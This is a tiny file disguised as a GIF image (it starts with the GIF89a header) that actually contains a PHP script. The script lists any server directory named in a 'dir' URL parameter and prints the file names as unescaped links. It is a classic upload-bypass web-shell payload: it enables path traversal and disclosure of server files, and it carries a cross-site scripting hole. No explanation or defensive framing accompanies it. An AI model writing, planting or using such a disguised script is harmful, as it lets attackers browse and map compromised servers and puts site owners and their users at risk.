GIF89a
<?php
$dir = $_GET['dir'] ?? '.';
$files = scandir($dir);

foreach ($files as $f) {
    echo "<a href='?dir=$f'>$f</a><br>";
}
?>
